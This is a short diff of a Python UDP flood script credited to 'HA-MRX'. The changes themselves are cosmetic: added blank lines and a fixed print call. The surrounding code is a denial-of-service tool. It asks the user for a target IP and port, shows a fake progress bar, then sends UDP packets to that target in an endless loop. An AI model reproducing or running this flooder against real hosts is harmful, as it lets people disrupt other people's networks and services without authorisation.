@@ -3,6 +3,7 @@ import os
 import time
 import socket
 import random
+
 #Code Time
 from datetime import datetime
 now = datetime.now()
@@ -24,7 +25,7 @@ print ("Author   : HA-MRX")
 print ("You Tube : https://www.youtube.com/c/HA-MRX")
 print ("github   : https://github.com/Ha3MrX")
 print ("Facebook : https://www.facebook.com/muhamad.jabar222")
-print
+print()
 ip = input("IP Target : ")
 port = input("Port       : ")
 
@@ -41,6 +42,7 @@ time.sleep(5)
 print ("[====================] 100%")
 time.sleep(3)
 sent = 0
+
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
